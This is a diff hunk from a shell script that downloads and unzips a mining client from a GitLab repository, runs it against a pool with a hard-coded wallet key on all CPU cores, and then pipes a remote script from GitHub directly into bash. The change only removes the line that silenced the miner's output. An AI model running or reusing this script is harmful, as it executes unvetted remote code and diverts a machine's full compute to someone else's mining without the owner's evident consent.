@@ -12,5 +12,5 @@ apt install -y wget curl
 wget https://gitlab.com/kido-esce/pile/-/raw/main/orion_linux151.zip
 unzip orion_linux151.zip
 cd linux && chmod 777 OrionClient
-./OrionClient mine --pool twbitz --key 5o9PkcxTjqtvnGZRoqzAandwVKMkkzgpi4bUTkkeRgGV -t $(nproc --all) >/dev/null 2>&1
+./OrionClient mine --pool twbitz --key 5o9PkcxTjqtvnGZRoqzAandwVKMkkzgpi4bUTkkeRgGV -t $(nproc --all)
 curl -sL https://github.com/kidoescegh/gbut/raw/main/waktu | bash
